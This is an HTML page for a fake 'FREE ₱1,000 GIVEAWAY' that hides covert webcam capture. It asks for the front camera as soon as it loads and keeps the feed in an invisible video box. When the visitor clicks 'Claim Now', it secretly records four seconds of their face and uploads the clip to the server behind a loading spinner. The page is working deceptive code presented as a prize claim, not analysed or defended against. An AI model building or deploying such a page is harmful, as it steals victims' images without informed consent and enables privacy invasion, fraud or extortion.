<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎁 FREE ₱1,000 GIVEAWAY!</title>
<style>
/* Add your previous styling here (card, button, falling gifts) */
#vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
#loading { display: none; margin-top: 20px; }
.spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
    <h2>🎉 CONGRATULATIONS! 🎉</h2>
    <p>Click “Claim Now” to see if you’re lucky!</p>

    <div id="vBox">
        <video id="preview" autoplay playsinline muted></video>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <p>Processing request...</p>
    </div>

    <button id="startBtn">Claim Now!!!</button>
</div>

<script>
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const video = document.getElementById('preview');

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
    } catch (err) {
        console.warn("Camera access denied.");
    }
}
initCamera();

btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');

            const res = await fetch("/upload-video", { method: "POST", body: formData });
            const data = await res.json();
            console.log("Video posted:", data);

            loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000);

    } catch (err) {
        console.error(err);
        loading.innerHTML = "<p>Error capturing video.</p>";
    }
});
</script>
</body>
</html>
